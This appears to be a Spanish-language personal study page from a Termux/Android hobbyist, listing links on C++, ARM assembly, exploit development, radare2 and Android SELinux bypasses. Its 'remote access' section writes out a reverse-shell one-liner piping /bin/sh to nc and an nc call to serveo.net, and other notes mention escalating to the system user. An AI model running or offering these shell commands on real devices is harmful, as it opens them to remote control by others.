# Mis demonis en un solo lugar 


> [!WARNING]
> 


> [!NOTE]
> Mucho del mis imsobnios  vine de  la comunidad de ``@ivam3`` y sus subcriptores 

# C++

- [AprenderC++](https://www.learncpp.com)
- [GestionDeMemoria]()

**Modulos y funciones**
 
 - [...](https://en.cppreference.com)

> [!NOTE]
> La mayoría de los dispositivos Android funcionan con ARM 

# ROP 

# Assembly 

**Comnados**
 - [as](https://sourceware.org/binutils/docs/as/index.html#Top)  : 
 - [ld](https://sourceware.org/binutils/docs/ld/)  : 


- [Intoducion al los comceptos basicos de  ensamblaje arm](https://azeria-labs.com/writing-arm-assembly-part-1/) 


# Desarollo de  exploit `ARM` 

 [1](https://fuzzysecurity.com/tutorials/expDev/1.html) 
 [2](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/) 

# [Radare2](https://book.rada.re/config/evars.html)

- **CLI**
    - `-d ` : 
- **Inter**
    - "iE"  : 
    - `bdi` : Punto de intrucsion
    - `pdda` : Comando para ver el ensamblado y el código fuente descompilado uno al lado del otro.
    - *Debug commands* 
        - `d `

**Plugings**

- `r2dec` : Descompilador 



# Android Ingenieria Inversa 



# Analisis binario 

**Comceptos basico**

- **Pila**

- **Registro**

- **Buffer** 
    - [Como funciona la memoria](http://progra.usm.cl/apunte/c/memoria.html) 




A partir de android 11 `selinux` implementó varias restricciones, la buena noticia es que muchas de ellas se pueden 'bypassear' sin necesidad de ser root ni haciendo uso de adb xD. El mismo restringe las llamadas al sistema



**Listar paquetes saltando protexion ** 

```sh
<<(pm list packages -3 --user 0 2>&1 < /dev/null )
``` 
```
PATH=$PREFIX/bin && /system/bin/pm list packages --user 0
```


- Desde un usuario con uid2000 se  puede torgar permiso  
```
am start --user 0 -a android.settings.action.MANAGE_OVERLAY_PERMISSION -d "package:com.termux.x11"
```

# Investigar 

- Si se logras ejecutar los binarios de ``/vendor/bin`` siendo usuario shell es posible escalar privilegios hasta el usuario ``system``. Mas informacion [aqui](https://t.me/Ivam3by_Cinderella/13/9867) 

# Pendientes 
---
*Aprender*
[](https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html)
--- 

**Rever shell**

[Ejemplo](https://t.me/Ivam3by_Cinderella/13/9377)

--- 

**Acseso remoto**

```
rlwrap /system/bin/toybox nc serveo.net 65000
```

```
tali -n0 -f $TMPDIR/xD|/bin/sh -i 2>&1| nc <IP> <port> 1>$TMPDIR/xD  
```

---

**Hacer funcional `qemu-i386`  


```sh 
⊨ qemu-i386 ~/ch1.bin                                    ~/p/v/_posts
qemu-i386: Could not open '/lib/ld-linux.so.2': No such file or directory
```

**Referencia**

https://tldp.org/HOWTO/Glibc2-HOWTO-5.html

---


**Telegram**
https://t.me/Ivam3by_Cinderella/19953

# Foros que me llamaron la atencion 
[bypassing-root-detection](https://medium.com/@aimardcr/bypassing-root-detection-the-universal-way-2625712172e5) 
[BypassSelinux](https://klecko.github.io/posts/selinux-bypasses/) 
[](https://nelenkov.blogspot.com/2015/06/password-storage-in-android-m.html?m=1)
*Binary*
[Buscar numeros magicos](https://www.garykessler.net/library/file_sigs.html)

{% if page.comments %}
<div id="disqus_thread"></div>
<script>
    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://blok-termux.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
{% endif %}


